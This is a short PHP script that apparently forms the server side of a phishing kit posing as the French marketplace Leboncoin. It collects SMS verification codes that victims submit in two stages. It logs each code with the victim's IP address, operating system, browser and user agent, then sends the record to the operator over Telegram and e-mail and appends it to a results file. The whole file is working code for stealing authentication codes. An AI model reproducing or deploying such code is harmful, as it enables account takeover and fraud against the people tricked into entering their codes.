<?php
error_reporting(0);
if(isset($_POST['smsAuth']) ){
include "../config.php";
include "inc/funcs.php";




$subject = "[Leboncoin] [1st SMS] INFO from $ip";

$info1 = $_POST['smsAuth'];

$message = "1st SMS: $info1\nOS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo '0';
}
else if(isset($_POST['smsAuth_Twice']) ){
include "../config.php";
include "inc/funcs.php";


$subject = "[Leboncoin] [2nd SMS] INFO from $ip";

$info1 = $_POST['smsAuth_Twice'];

$message = "2nd SMS: $info1\nOS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
mail($email,$subject,$message);


$op = fopen($resText,'a+');
fwrite($op,$message);
fclose($op);

echo '1';
}
else{

	echo '1';
}
?>
